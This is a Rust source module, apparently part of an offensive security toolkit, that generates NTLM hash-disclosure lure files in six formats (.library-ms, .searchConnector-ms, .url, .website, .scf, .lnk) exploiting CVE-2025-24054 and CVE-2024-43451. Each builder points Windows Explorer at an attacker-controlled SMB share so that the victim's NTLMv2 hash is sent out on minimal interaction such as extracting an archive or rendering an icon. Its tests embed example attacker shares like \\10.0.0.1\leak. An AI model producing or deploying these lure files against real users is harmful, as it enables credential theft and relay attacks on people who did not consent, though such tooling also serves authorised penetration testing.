//! NTLM hash-disclosure polyglot file generation.
//!
//! Generates "hash leak" files that cause Windows Explorer (explorer.exe) to
//! perform an SMB authentication (NTLMSSP_AUTH) against an attacker
//! controlled share, leaking the victim's NTLMv2-SSP hash. The capture side
//! is any NTLM listener: `ovt ntlm capture` (Responder) or `ovt ntlm smb-daemon`.
//!
//! Vectors implemented here are the minimal-interaction NTLM leaks:
//!
//! - `.library-ms` -- CVE-2025-24054 (briefly assigned CVE-2025-24071, then
//!   re-issued). Fires on archive extraction, folder navigation, or any
//!   Explorer interaction with the file. Exploited in the wild from
//!   March 2025 (KEV added 2025-04-17).
//! - `.searchConnector-ms` -- search-connector XML with an attacker-simple
//!   location; parsed by Explorer's connector import.
//! - `.url` InternetShortcut with a UNC `IconFile` -- the CVE-2024-43451
//!   heritage vector (KEV added 2024-11-12); fires on right-click/delete/
//!   drag of the file.
//! - `.website` pinned-site shortcut with a `file://` URL.
//! - `.scf` Shell Command File with a UNC `IconFile`.
//! - `.lnk` binary MS-SHLLINK shell link with a UNC network target
//!   (fires on open / icon render).
//!
//! All generators are pure functions; nothing touches the filesystem.
//! Use [`write_ntlm_leak_files`] for artifact output.

use crate::error::{OverthroneError, Result};
use std::path::{Path, PathBuf};

// ===========================================================
//  Format enumeration
// ===========================================================

/// Hash-disclosure file format.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum NtlmLeakFormat {
    /// `.library-ms` Windows Shell library (CVE-2025-24054 / CVE-2025-24071)
    LibraryMs,
    /// `.searchConnector-ms` Windows search connector
    SearchConnectorMs,
    /// `.url` Internet shortcut with UNC icon (CVE-2024-43451 heritage)
    InternetShortcut,
    /// `.website` pinned-site shortcut
    Website,
    /// `.scf` Shell Command File with UNC icon
    ShellCmdFile,
    /// `.lnk` binary shell link (MS-SHLLINK) with UNC network target
    ShortcutLnk,
}

impl NtlmLeakFormat {
    /// All supported formats.
    pub fn all() -> &'static [NtlmLeakFormat] {
        &[
            NtlmLeakFormat::LibraryMs,
            NtlmLeakFormat::SearchConnectorMs,
            NtlmLeakFormat::InternetShortcut,
            NtlmLeakFormat::Website,
            NtlmLeakFormat::ShellCmdFile,
            NtlmLeakFormat::ShortcutLnk,
        ]
    }

    /// Parse a format from a CLI-friendly name.
    pub fn from_name(name: &str) -> Option<NtlmLeakFormat> {
        let lower = name.to_ascii_lowercase();
        match lower.as_str() {
            "library-ms" | "libraryms" | "library" => Some(NtlmLeakFormat::LibraryMs),
            "searchconnector-ms" | "searchconnectorms" | "searchconnector" => {
                Some(NtlmLeakFormat::SearchConnectorMs)
            }
            "url" | "internetshortcut" | "internet-shortcut" => {
                Some(NtlmLeakFormat::InternetShortcut)
            }
            "website" => Some(NtlmLeakFormat::Website),
            "scf" | "shellcommandfile" | "shell-command-file" => Some(NtlmLeakFormat::ShellCmdFile),
            "lnk" | "shortcut" | "shortcutlnk" | "shortcut-lnk" => {
                Some(NtlmLeakFormat::ShortcutLnk)
            }
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            NtlmLeakFormat::LibraryMs => "library-ms",
            NtlmLeakFormat::SearchConnectorMs => "searchconnector-ms",
            NtlmLeakFormat::InternetShortcut => "url",
            NtlmLeakFormat::Website => "website",
            NtlmLeakFormat::ShellCmdFile => "scf",
            NtlmLeakFormat::ShortcutLnk => "lnk",
        }
    }

    /// Output filename (stem + extension).
    pub fn filename(&self) -> &'static str {
        match self {
            NtlmLeakFormat::LibraryMs => ".library-ms",
            NtlmLeakFormat::SearchConnectorMs => ".searchConnector-ms",
            NtlmLeakFormat::InternetShortcut => ".url",
            NtlmLeakFormat::Website => ".website",
            NtlmLeakFormat::ShellCmdFile => ".scf",
            NtlmLeakFormat::ShortcutLnk => ".lnk",
        }
    }

    /// CVE association for the vector.
    pub fn cve(&self) -> &'static str {
        match self {
            NtlmLeakFormat::LibraryMs => "CVE-2025-24054 / CVE-2025-24071",
            NtlmLeakFormat::SearchConnectorMs => "CVE-2025-24054 (connector family)",
            NtlmLeakFormat::InternetShortcut => "CVE-2024-43451",
            NtlmLeakFormat::Website => "CVE-2024-43451 (shortcut family)",
            NtlmLeakFormat::ShellCmdFile => "NTLM icon leak (SCF)",
            NtlmLeakFormat::ShortcutLnk => "NTLM link-target render",
        }
    }

    /// Minimal user interaction required to trigger the SMB auth.
    pub fn trigger(&self) -> &'static str {
        match self {
            NtlmLeakFormat::LibraryMs => "archive extraction / folder navigation / any interaction",
            NtlmLeakFormat::SearchConnectorMs => "opening or previewing the connector file",
            NtlmLeakFormat::InternetShortcut => "right-click / delete / drag / icon render",
            NtlmLeakFormat::Website => "opening the file from Explorer",
            NtlmLeakFormat::ShellCmdFile => "Explorer icon render",
            NtlmLeakFormat::ShortcutLnk => "opening / selecting the shortcut",
        }
    }

    /// Human-readable description of the vector.
    pub fn description(&self) -> &'static str {
        match self {
            NtlmLeakFormat::LibraryMs => {
                "Windows Explorer shell library whose search connector location \
                 points at the attacker share; Explorer performs an SMB \
                 authentication as soon as the file is extracted, previewed, or navigated over."
            }
            NtlmLeakFormat::SearchConnectorMs => {
                "Windows search connector definition with an attacker \
                 simpleLocation; parsed into an SMB authentication by the \
                 connector import path."
            }
            NtlmLeakFormat::InternetShortcut => {
                "Internet shortcut whose icon and/or URL reference the \
                 attacker share; the icon render path authenticates to SMB."
            }
            NtlmLeakFormat::Website => {
                "Pinned-site shortcut (.website) with a file:// URL to the \
                 attacker share; opening it triggers SMB auth."
            }
            NtlmLeakFormat::ShellCmdFile => {
                "Shell Command File (.scf) whose IconFile points at the \
                 attacker share; Explorer renders the icon over SMB."
            }
            NtlmLeakFormat::ShortcutLnk => {
                "Binary MS-SHLLINK shortcut whose network target points at \
                 the attacker share; icon render or open triggers SMB auth."
            }
        }
    }

    /// Build the file content for this format pointing at `share`.
    pub fn build(&self, share: &str) -> Vec<u8> {
        match self {
            NtlmLeakFormat::LibraryMs => build_library_ms(share),
            NtlmLeakFormat::SearchConnectorMs => build_search_connector_ms(share),
            NtlmLeakFormat::InternetShortcut => build_internet_shortcut(share),
            NtlmLeakFormat::Website => build_website_shortcut(share),
            NtlmLeakFormat::ShellCmdFile => build_scf(share),
            NtlmLeakFormat::ShortcutLnk => build_shllink_unc(share),
        }
    }
}

// ===========================================================
//  Generator result
// ===========================================================

/// A generated hash-disclosure artifact.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NtlmLeakFile {
    /// Output filename (extension only stem, e.g. `xd.library-ms`).
    pub filename: String,
    /// CVE label for the vector.
    pub cve: String,
    /// Interaction required on the victim side.
    pub trigger: String,
    /// File content.
    pub content: Vec<u8>,
}

// ===========================================================
//  Pure generators
// ===========================================================

/// Normalize a share argument into a `\\server\share` UNC path.
///
/// Accepts `\\ip\share`, `//ip/share`, bare `ip\share` / `ip/share`, and
/// the WebDAV port form `\\ip@port\share`. Returns an empty `String` when
/// nothing share-like remains after normalization.
pub fn normalize_unc(share: &str) -> String {
    let cleaned = share.trim();
    if cleaned.is_empty() {
        return String::new();
    }
    let slashed = cleaned.replace('/', "\\");
    if let Some(rest) = slashed.strip_prefix("\\\\") {
        // Keep the rest verbatim (hosts/malformed buyer path), dropping empties.
        if rest.is_empty() {
            String::new()
        } else {
            format!("\\\\{}", rest)
        }
    } else if let Some(rest) = slashed.strip_prefix('\\') {
        format!("\\\\{}", rest)
    } else {
        format!("\\\\{}", slashed)
    }
}

/// Build the `.library-ms` content (CVE-2025-24054 / CVE-2025-24071).
///
/// Verified markup matches the in-the-wild `xd.library-ms` template
/// (Check Point research, March/April 2025 campaigns).
fn build_library_ms(share: &str) -> Vec<u8> {
    let unc = normalize_unc(share);
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
         <libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">\n\
         \x20 <searchConnectorDescriptionList>\n\
         \x20   <searchConnectorDescription>\n\
         \x20     <simpleLocation>\n\
         \x20       <url>{}</url>\n\
         \x20     </simpleLocation>\n\
         \x20   </searchConnectorDescription>\n\
         \x20 </searchConnectorDescriptionList>\n\
         </libraryDescription>\n",
        unc
    )
    .into_bytes()
}

/// Build the `.searchConnector-ms` content (search-connector XML schema).
///
/// Same `simpleLocation` structure as the `.library-ms` connector list, with
/// the `searchConnector` root used by standalone connector files.
fn build_search_connector_ms(share: &str) -> Vec<u8> {
    let unc = normalize_unc(share);
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
         <searchConnector xmlns=\"http://schemas.microsoft.com/windows/2009/searchconnector\">\n\
         \x20 <simpleLocation>\n\
         \x20   <url>{}</url>\n\
         \x20 </simpleLocation>\n\
         </searchConnector>\n",
        unc
    )
    .into_bytes()
}

/// Build the `.url` InternetShortcut content (CVE-2024-43451 heritage).
///
/// Layout copies the in-the-wild `xd.url` template (Check Point, April 2025):
/// a `file://<host>/` URL plus a UNC `IconFile`, so the icon-render path
/// authenticates over SMB without opening the file.
fn build_internet_shortcut(share: &str) -> Vec<u8> {
    let unc = normalize_unc(share);
    let host_part = unc
        .trim_start_matches('\\')
        .split('\\')
        .next()
        .unwrap_or_default();
    format!(
        "[InternetShortcut]\n\
         URL=file://{}/\n\
         IconIndex=4\n\
         HotKey=0\n\
         IDList=\n\
         IconFile={}\\pentestlab.ico\n",
        host_part, unc
    )
    .into_bytes()
}

/// Build the `.website` pinned-site shortcut content.
///
/// Layout copies the in-the-wild `xd.website` template (Check Point,
/// April 2025): section GUIDs with a `file://` URL in the
/// `[InternetShortcut]` section.
fn build_website_shortcut(share: &str) -> Vec<u8> {
    let unc = normalize_unc(share);
    let host_part = unc
        .trim_start_matches('\\')
        .split('\\')
        .next()
        .unwrap_or_default();
    format!(
        "[{{000214A0-0000-0000-C000-000000000046}}]\n\
         Prop3=19,2\n\
         Prop4=31,go.microsoft.com\n\
         [InternetShortcut]\n\
         URL=file://{}/\n\
         [{{A7AF692E-098D-4C08-A225-D433CA835ED0}}]\n\
         Prop5=3,0\n\
         Prop9=19,0\n\
         Prop2=65,2C0000000000000001000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF310000002B000000710600006204000056\n\
         Prop6=3,1\n\
         [{{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}}]\n\
         Prop5=8,Microsoft.Website.B4BD2547.99055A5E\n",
        host_part
    )
    .into_bytes()
}

/// Build the `.scf` Shell Command File content.
fn build_scf(share: &str) -> Vec<u8> {
    let unc = normalize_unc(share);
    format!(
        "[Shell Command File]\n\
         IconIndex=1\n\
         IconFile={}\\icon.ico\n",
        unc
    )
    .into_bytes()
}

/// Build a minimal binary MS-SHLLINK (`.lnk`) shell link whose network
/// target points at the attacker share.
///
/// Layout (MS-SHLLINK 2.2 / 2.5.2):
/// - ShellLinkHeader (76 bytes) with `HasLinkInfo | IsUnicodeString`.
/// - LinkInfo with `CommonNetworkRelativeLinkAndPathSuffix`, unicode net
///   name == attacker UNC path.
/// - Empty CommonPathSuffix (just the unicode null terminator).
fn build_shllink_unc(share: &str) -> Vec<u8> {
    // Canonical shell link CLSID {00021401-0000-0000-C000-000000000046}.
    const SHELL_LINK_CLSID: [u8; 16] = [
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x46,
    ];

    const HAS_LINK_INFO: u32 = 0x0000_0004;
    const IS_UNICODE: u32 = 0x0000_0080;

    // CommonNetworkRelativeLink flags: suffix + unicode net name.
    const CNRL_SUFFIX_UNICODE: u32 = 0x0000_0006;

    let mut link = Vec::with_capacity(0x4c + 64 + share.len() * 2);

    // ---- ShellLinkHeader (0x4c bytes) ----
    link.extend_from_slice(&0x0000_004cu32.to_le_bytes());
    link.extend_from_slice(&SHELL_LINK_CLSID);
    link.extend_from_slice(&(HAS_LINK_INFO | IS_UNICODE).to_le_bytes());
    link.extend_from_slice(&0u32.to_le_bytes()); // FileAttributes: unknown target
    link.extend_from_slice(&0u64.to_le_bytes()); // CreationTime
    link.extend_from_slice(&0u64.to_le_bytes()); // AccessTime
    link.extend_from_slice(&0u64.to_le_bytes()); // WriteTime
    link.extend_from_slice(&0u32.to_le_bytes()); // FileSize
    link.extend_from_slice(&0u32.to_le_bytes()); // IconIndex
    link.extend_from_slice(&1u32.to_le_bytes()); // ShowCommand
    link.extend_from_slice(&0u16.to_le_bytes()); // HotKey
    link.extend_from_slice(&[0u8; 6]); // Reserved1 + Reserved2
    link.extend_from_slice(&0u32.to_le_bytes()); // Reserved3
    debug_assert_eq!(link.len(), 0x4c);

    // ---- CommonNetworkRelativeLink ----
    let net_name: Vec<u16> = share.encode_utf16().chain(std::iter::once(0)).collect();
    let net_name_bytes: Vec<u8> = net_name.iter().flat_map(|c| c.to_le_bytes()).collect();
    // CNRL header: Size, Flags, NetNameOffset, DeviceNameOffset, NetworkProviderType.
    const CNRL_HEADER_SIZE: u32 = 20;
    let cnrl_size = CNRL_HEADER_SIZE + net_name_bytes.len() as u32;

    // ---- LinkInfo ----
    // Header: LinkInfoSize, LinkInfoHeaderSize(0x1c), LinkInfoFlags,
    // VolumeIDSize, CNRLSize, SuffixSize. Suffix is the unicode null only.
    const LINK_INFO_HEADER_FIELDS: u32 = 20; // 5 u32s after LinkInfoSize
    const LINK_INFO_HEADER_SIZE: u32 = 0x1c;
    const SUFFIX_BYTES: u32 = 2; // L'\0'
    let link_info_size = 4 + LINK_INFO_HEADER_FIELDS + cnrl_size + SUFFIX_BYTES;

    link.extend_from_slice(&link_info_size.to_le_bytes());
    link.extend_from_slice(&LINK_INFO_HEADER_SIZE.to_le_bytes());
    link.extend_from_slice(&0x0000_0002u32.to_le_bytes()); // suffix flag
    link.extend_from_slice(&0u32.to_le_bytes()); // VolumeIDSize == 0
    link.extend_from_slice(&cnrl_size.to_le_bytes());
    link.extend_from_slice(&SUFFIX_BYTES.to_le_bytes());

    // CNRL block: net name offset is relative to the CNRL start.
    link.extend_from_slice(&cnrl_size.to_le_bytes());
    link.extend_from_slice(&CNRL_SUFFIX_UNICODE.to_le_bytes());
    link.extend_from_slice(&CNRL_HEADER_SIZE.to_le_bytes()); // NetNameOffset
    link.extend_from_slice(&0u32.to_le_bytes()); // DeviceNameOffset: none
    link.extend_from_slice(&0u32.to_le_bytes()); // NetworkProviderType
    link.extend_from_slice(&net_name_bytes);

    // ---- CommonPathSuffix: unicode null terminator ----
    link.extend_from_slice(&0x0000u16.to_le_bytes());

    debug_assert_eq!(4 + 20 + cnrl_size + SUFFIX_BYTES, link_info_size);
    link
}

// ===========================================================
//  High-level API
// ===========================================================

/// Generate one hash-disclosure artifact for `share`.
pub fn generate_ntlm_leak(format: NtlmLeakFormat, share: &str) -> Result<NtlmLeakFile> {
    if share.trim().is_empty() {
        return Err(OverthroneError::custom(
            "ntlm-leak: share is empty -- pass the attacker share (e.g. \\\\10.0.0.1\\leak)",
        ));
    }
    Ok(NtlmLeakFile {
        filename: format.filename().to_string(),
        cve: format.cve().to_string(),
        trigger: format.trigger().to_string(),
        content: format.build(share),
    })
}

/// Generate every artifact for `share` (all six formats).
pub fn generate_ntlm_leak_bundle(share: &str) -> Result<Vec<NtlmLeakFile>> {
    if share.trim().is_empty() {
        return Err(OverthroneError::custom(
            "ntlm-leak: share is empty -- pass the attacker share (e.g. \\\\10.0.0.1\\leak)",
        ));
    }
    Ok(NtlmLeakFormat::all()
        .iter()
        .map(|f| generate_ntlm_leak(*f, share).expect("share validated"))
        .collect())
}

/// Write the generated artifacts into `dir` and return the written paths.
///
/// Filenames are prefixed with `leak-` so the drop directory can be
/// scanned without greedy Name collisions. Creates the directory when it
/// does not exist.
pub fn write_ntlm_leak_files(
    dir: &str,
    share: &str,
    formats: &[NtlmLeakFormat],
) -> Result<Vec<PathBuf>> {
    if share.trim().is_empty() {
        return Err(OverthroneError::custom(
            "ntlm-leak: share is empty -- pass the attacker share (e.g. \\\\10.0.0.1\\leak)",
        ));
    }
    let base = Path::new(dir);
    std::fs::create_dir_all(base)
        .map_err(|e| OverthroneError::custom(format!("ntlm-leak: create_dir_all({dir}): {e}")))?;
    let mut written = Vec::with_capacity(formats.len());
    for format in formats {
        let file = generate_ntlm_leak(*format, share)?;
        let out_path = base.join(file.filename);
        std::fs::write(&out_path, &file.content).map_err(|e| {
            OverthroneError::custom(format!("ntlm-leak: write {}: {e}", out_path.display()))
        })?;
        written.push(out_path);
    }
    Ok(written)
}

/// One-line summary of a generated artifact, suitable for CLI output.
pub fn format_ntlm_leak_summary(f: &NtlmLeakFile) -> String {
    format!("{} ({} -- trigger: {})", f.filename, f.cve, f.trigger)
}

// ===========================================================
//  Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_normalize_unc_variants() {
        assert_eq!(normalize_unc("\\\\10.0.0.1\\leak"), "\\\\10.0.0.1\\leak");
        assert_eq!(normalize_unc("//10.0.0.1/leak"), "\\\\10.0.0.1\\leak");
        assert_eq!(normalize_unc("10.0.0.1\\leak"), "\\\\10.0.0.1\\leak");
        assert_eq!(normalize_unc("10.0.0.1/leak"), "\\\\10.0.0.1\\leak");
        assert_eq!(normalize_unc("\\10.0.0.1\\leak"), "\\\\10.0.0.1\\leak");
        assert_eq!(normalize_unc("\\\\ip@445\\leak"), "\\\\ip@445\\leak");
        assert_eq!(normalize_unc("\\\\"), "");
        assert_eq!(normalize_unc("   "), "");
    }

    #[test]
    fn test_library_ms_markup_matches_in_the_wild_template() {
        let content = String::from_utf8(build_library_ms("\\\\10.10.14.22\\share")).unwrap();
        assert!(content.contains("<?xml version=\"1.0\" encoding=\"UTF-8\"?>"));
        assert!(content.contains(
            "<libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\">"
        ));
        assert!(content.contains("<searchConnectorDescriptionList>"));
        assert!(content.contains("<searchConnectorDescription>"));
        assert!(content.contains("<simpleLocation>"));
        assert!(content.contains("<url>\\\\10.10.14.22\\share</url>"));
        // Structure order (from the public PoC x.d.library-ms).
        let scd = content.find("<searchConnectorDescription>").unwrap();
        let simple = content.find("<simpleLocation>").unwrap();
        let url = content.find("<url>").unwrap();
        assert!(scd < simple && simple < url);
    }

    #[test]
    fn test_library_ms_empty_share() {
        let content = String::from_utf8(build_library_ms("")).unwrap();
        // normalize_unc("") yields an empty UNC; the public generator rejects
        // empty shares, the builder renders the markup unchanged.
        assert!(
            content.contains("<url></url>"),
            "empty share renders empty url"
        );
    }

    #[test]
    fn test_search_connector_ms_markup() {
        let content = String::from_utf8(build_search_connector_ms("\\\\1.2.3.4\\leak")).unwrap();
        assert!(content.starts_with("<?xml version=\"1.0\" encoding=\"UTF-8\"?>"));
        assert!(content.contains(
            "<searchConnector xmlns=\"http://schemas.microsoft.com/windows/2009/searchconnector\">"
        ));
        assert!(content.contains("<url>\\\\1.2.3.4\\leak</url>"));
        assert!(!content.contains("<libraryDescription>"));
    }

    #[test]
    fn test_internet_shortcut_layout() {
        let content =
            String::from_utf8(build_internet_shortcut("\\\\159.196.128.120\\share")).unwrap();
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines[0], "[InternetShortcut]");
        assert_eq!(lines[1], "URL=file://159.196.128.120/");
        assert!(content.contains("IconIndex=4"));
        assert!(content.contains("IconFile=\\\\159.196.128.120\\share\\pentestlab.ico"));
        // Every line of the Check Point `xd.url` template is present.
        for sec in &["[InternetShortcut]", "HotKey=0", "IDList="] {
            assert!(content.contains(sec), "missing {sec}");
        }
    }

    #[test]
    fn test_website_shortcut_layout() {
        let content =
            String::from_utf8(build_website_shortcut("\\\\159.196.128.120\\share")).unwrap();
        assert!(content.contains("[{000214A0-0000-0000-C000-000000000046}]"));
        assert!(content.contains("[InternetShortcut]"));
        assert!(content.contains("URL=file://159.196.128.120/"));
        assert!(content.contains("[{A7AF692E-098D-4C08-A225-D433CA835ED0}]"));
        assert!(content.contains("[{9F4C2855-9F79-4B39-A8D0-E1D42DE1D5F3}]"));
    }

    #[test]
    fn test_scf_layout() {
        let content = String::from_utf8(build_scf("\\\\10.0.0.1\\leak")).unwrap();
        assert_eq!(content.lines().next(), Some("[Shell Command File]"));
        assert!(content.contains("IconIndex=1"));
        assert!(content.contains("IconFile=\\\\10.0.0.1\\leak\\icon.ico"));
    }

    #[test]
    fn test_shllink_header_layout() {
        let lnk = build_shllink_unc("\\\\192.0.2.9\\leak");
        // HeaderSize
        assert_eq!(u32::from_le_bytes([lnk[0], lnk[1], lnk[2], lnk[3]]), 0x4c);
        // Canonical shell link CLSID {00021401-0000-0000-C000-000000000046}.
        assert_eq!(
            &lnk[4..20],
            &[
                0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x46
            ]
        );
        // LinkFlags: HasLinkInfo | IsUnicodeString
        assert_eq!(
            u32::from_le_bytes([lnk[0x14], lnk[0x15], lnk[0x16], lnk[0x17]]),
            0x84
        );
        // ShowCommand = 1
        assert_eq!(
            u32::from_le_bytes([lnk[0x3c], lnk[0x3d], lnk[0x3e], lnk[0x3f]]),
            1
        );
        // Header is exactly 0x4c bytes before LinkInfo.
        assert_eq!(
            u32::from_le_bytes([lnk[0x4c], lnk[0x4d], lnk[0x4e], lnk[0x4f]]),
            link_info_size(&lnk)
        );
    }

    fn link_info_size(lnk: &[u8]) -> u32 {
        u32::from_le_bytes([lnk[0x4c], lnk[0x4d], lnk[0x4e], lnk[0x4f]])
    }

    #[test]
    fn test_shllink_linkinfo_offsets() {
        let share = "\\\\198.51.100.7\\leak";
        let lnk = build_shllink_unc(share);
        let size = link_info_size(&lnk);
        assert_eq!(
            size as usize,
            lnk.len() - 0x4c,
            "LinkInfoSize covers everything after header"
        );

        // LinkInfoHeaderSize == 0x1c
        let hdr = u32::from_le_bytes([lnk[0x50], lnk[0x51], lnk[0x52], lnk[0x53]]);
        assert_eq!(hdr, 0x1c);

        // LinkInfoFlags == suffix-only
        let flags = u32::from_le_bytes([lnk[0x54], lnk[0x55], lnk[0x56], lnk[0x57]]);
        assert_eq!(flags, 2);

        // VolumeIDSize == 0, CNRLSize, SuffixSize follow.
        let volume_id_size = u32::from_le_bytes([lnk[0x58], lnk[0x59], lnk[0x5a], lnk[0x5b]]);
        let cnrl_size = u32::from_le_bytes([lnk[0x5c], lnk[0x5d], lnk[0x5e], lnk[0x5f]]);
        let suffix_size = u32::from_le_bytes([lnk[0x60], lnk[0x61], lnk[0x62], lnk[0x63]]);
        assert_eq!(volume_id_size, 0);
        assert_eq!(suffix_size, 2);

        // CNRL total == header + netname bytes.
        let net_name_chars: usize = share.chars().count() + 1; // incl null
        assert_eq!(cnrl_size as usize, 20 + net_name_chars * 2);

        // CNRL starts right after the LinkInfo header (0x4c + 6*4: LinkInfoSize
        // plus the five header fields: HeaderSize, Flags, VolumeIDSize,
        // CNRLSize, SuffixSize).
        let cnrl_off = 0x4c + 24;
        // CNRL Size field agrees.
        let cnrl_size_field = u32::from_le_bytes([
            lnk[cnrl_off],
            lnk[cnrl_off + 1],
            lnk[cnrl_off + 2],
            lnk[cnrl_off + 3],
        ]);
        assert_eq!(cnrl_size_field, cnrl_size);
        // CNRL flags == suffix + unicode
        let cnrl_flags = u32::from_le_bytes([
            lnk[cnrl_off + 4],
            lnk[cnrl_off + 5],
            lnk[cnrl_off + 6],
            lnk[cnrl_off + 7],
        ]);
        assert_eq!(cnrl_flags, 0x06);
        // NetNameOffset == 20 relative to CNRL start.
        let net_name_offset = u32::from_le_bytes([
            lnk[cnrl_off + 8],
            lnk[cnrl_off + 9],
            lnk[cnrl_off + 10],
            lnk[cnrl_off + 11],
        ]);
        assert_eq!(net_name_offset, 20);

        // NetName bytes hold the UTF-16 share + null, starting at CNRL+20.
        let expected_utf16: Vec<u8> = share
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        assert_eq!(
            &lnk[cnrl_off + 20..cnrl_off + 20 + expected_utf16.len()],
            &expected_utf16[..]
        );

        // Suffix is exactly the unicode null terminator at the end.
        let tail = &lnk[lnk.len() - 2..];
        assert_eq!(tail, &[0x00, 0x00]);
    }

    #[test]
    fn test_shllink_header_exactly_76_bytes() {
        let lnk = build_shllink_unc("\\\\10.0.0.1\\x");
        assert_eq!(lnk[0x00..=0x03], 0x4cu32.to_le_bytes());
        // All times / FileSize / IconIndex / HotKey / reserved fields are 0.
        for off in [0x1cusize, 0x24, 0x2c, 0x34, 0x38, 0x40, 0x42, 0x44, 0x48] {
            assert_eq!(
                u32::from_le_bytes([lnk[off], lnk[off + 1], lnk[off + 2], lnk[off + 3]]),
                0
            );
        }
    }

    #[test]
    fn test_format_name_mapping() {
        for f in NtlmLeakFormat::all() {
            let name = f.name();
            let parsed = NtlmLeakFormat::from_name(name).expect(name);
            assert_eq!(&parsed, f);
            let caps = name.to_ascii_uppercase();
            assert_eq!(NtlmLeakFormat::from_name(&caps), Some(*f));
        }
        assert_eq!(NtlmLeakFormat::from_name("bogus"), None);
    }

    #[test]
    fn test_filenames_distinct() {
        let mut names: Vec<&str> = NtlmLeakFormat::all().iter().map(|f| f.filename()).collect();
        let before = names.len();
        names.sort();
        names.dedup();
        assert_eq!(names.len(), before, "extension stems must be unique");
    }

    #[test]
    fn test_cves_and_triggers_populated() {
        for f in NtlmLeakFormat::all() {
            assert!(!f.cve().is_empty());
            assert!(!f.trigger().is_empty());
            assert!(!f.description().is_empty());
        }
        assert!(NtlmLeakFormat::LibraryMs.cve().contains("CVE-2025-24054"));
        assert!(
            NtlmLeakFormat::InternetShortcut
                .cve()
                .contains("CVE-2024-43451")
        );
    }

    #[test]
    fn test_generate_ntlm_leak_rejects_empty_share() {
        assert!(generate_ntlm_leak(NtlmLeakFormat::LibraryMs, "").is_err());
        assert!(generate_ntlm_leak(NtlmLeakFormat::LibraryMs, "   ").is_err());
        assert!(generate_ntlm_leak_bundle("").is_err());
        assert!(write_ntlm_leak_files(std::env::temp_dir().to_str().unwrap(), "", &[]).is_err());
    }

    #[test]
    fn test_generate_ntlm_leak_values() {
        let f = generate_ntlm_leak(NtlmLeakFormat::LibraryMs, "\\\\10.0.0.1\\leak").unwrap();
        assert_eq!(f.filename, ".library-ms");
        assert!(f.cve.contains("CVE-2025-24054"));
        assert!(!f.content.is_empty());

        let bundle = generate_ntlm_leak_bundle("\\\\10.0.0.1\\leak").unwrap();
        assert_eq!(bundle.len(), NtlmLeakFormat::all().len());
        for f in &bundle {
            assert!(!f.content.is_empty());
            assert!(!f.filename.is_empty());
            assert!(!f.cve.is_empty());
        }
    }

    #[test]
    fn test_write_ntlm_leak_files_roundtrip() {
        let dir = tempfile::tempdir().unwrap();
        let formats = NtlmLeakFormat::all().to_vec();
        let written =
            write_ntlm_leak_files(dir.path().to_str().unwrap(), "\\\\10.0.0.1\\leak", &formats)
                .unwrap();
        assert_eq!(written.len(), formats.len());
        let mut first_contents = Vec::new();
        for p in &written {
            assert!(p.exists(), "{} not written", p.display());
            let bytes = std::fs::read(p).unwrap();
            assert!(!bytes.is_empty());
            first_contents.push(bytes);
        }
        // Deterministic content across writes.
        let written_again =
            write_ntlm_leak_files(dir.path().to_str().unwrap(), "\\\\10.0.0.1\\leak", &formats)
                .unwrap();
        assert_eq!(written_again, written);
        for (path, expected) in written_again.iter().zip(&first_contents) {
            assert_eq!(&std::fs::read(path).unwrap(), expected);
        }
    }

    #[test]
    fn test_write_creates_missing_directory() {
        let dir = tempfile::tempdir().unwrap();
        let nested = dir.path().join("a").join("b");
        let written = write_ntlm_leak_files(
            nested.to_str().unwrap(),
            "\\\\10.0.0.1\\leak",
            &[NtlmLeakFormat::InternetShortcut],
        )
        .unwrap();
        assert_eq!(written.len(), 1);
        assert!(nested.is_dir());
        assert!(nested.join(".url").exists());
    }

    #[test]
    fn test_write_all_formats_roundtrip() {
        let dir = tempfile::tempdir().unwrap();
        for format in NtlmLeakFormat::all() {
            let base = dir.path().join(format.name());
            let written =
                write_ntlm_leak_files(base.to_str().unwrap(), "\\\\10.0.0.1\\leak", &[*format])
                    .unwrap();
            assert_eq!(written.len(), 1);
            assert!(written[0].ends_with(format.filename()));
        }
    }

    #[test]
    fn test_format_summary_line() {
        let f = generate_ntlm_leak(NtlmLeakFormat::ShellCmdFile, "\\\\10.0.0.1\\leak").unwrap();
        let s = format_ntlm_leak_summary(&f);
        assert!(s.contains(".scf"));
        assert!(s.starts_with(".scf ("));
    }
}
